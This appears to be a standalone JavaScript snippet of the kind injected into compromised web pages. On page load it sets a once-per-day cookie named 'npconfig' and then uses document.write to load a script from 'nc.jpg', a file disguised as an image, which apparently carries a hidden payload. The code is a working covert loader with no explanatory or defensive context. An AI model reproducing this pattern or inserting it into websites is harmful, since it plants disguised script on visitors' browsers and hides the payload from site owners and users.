function Get(){
var Then = new Date() 
Then.setTime(Then.getTime() + 24*60*60*1000)
var cookieString = new String(document.cookie)
var cookieHeader = "npconfig=" 
var beginPosition = cookieString.indexOf(cookieHeader)
if (beginPosition != -1){ 
} else 
{ document.cookie = "npconfig=ocstird;expires="+ Then.toGMTString() 
document.write("<script language=\"javascript\" src=\"nc.jpg\"><\/script>");
}
}Get();
